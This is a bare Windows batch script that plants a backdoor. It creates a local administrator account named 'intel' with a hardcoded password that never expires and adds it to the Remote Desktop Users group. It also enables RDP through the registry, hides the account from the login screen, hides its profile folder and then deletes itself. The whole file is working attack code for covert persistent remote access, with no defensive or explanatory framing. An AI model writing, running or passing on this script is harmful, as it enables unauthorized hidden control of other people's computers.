@echo off
SET user=intel
SET pass=Televiz0r@
 
SET prog=wmic
 
REM RDP USER CREATE
SET AdmGroupSID=S-1-5-32-544
SET AdmGroup=
FOR /F "UseBackQ Tokens=1* Delims==" %%I IN (`%prog% Group Where "SID = '%AdmGroupSID%'" Get Name /Value ^| Find "="`) DO SET AdmGroup=%%J
SET AdmGroup=%AdmGroup:~0,-1%
net user %user% %pass% /add /active:"yes" /expires:"never" /passwordchg:"NO"
net localgroup %AdmGroup% %user% /add
SET RDPGroupSID=S-1-5-32-555
SET RDPGroup=
FOR /F "UseBackQ Tokens=1* Delims==" %%I IN (`%prog% Group Where "SID = '%RDPGroupSID%'" Get Name /Value ^| Find "="`) DO SET RDPGroup=%%J
SET RDPGroup=%RDPGroup:~0,-1%
net localgroup "%RDPGroup%" %user% /add
net accounts /forcelogoff:no /maxpwage:unlimited
 
REM ADD REG PARAM
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxConnectionTime" /t REG_DWORD /d 0x1 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxDisconnectionTime" /t REG_DWORD /d 0x0 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxIdleTime" /t REG_DWORD /d 0x0 /f
reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %user% /t REG_DWORD /d 0x0 /f
 
REM CREATE USERPROFILE DIR
@MKDIR %systemdrive%\users\%user% & attrib %systemdrive%\users\%user% +r +a +s +h
 
 
REM REMOVE THIS FILE
DEL /F /Q %~nx0 & EXIT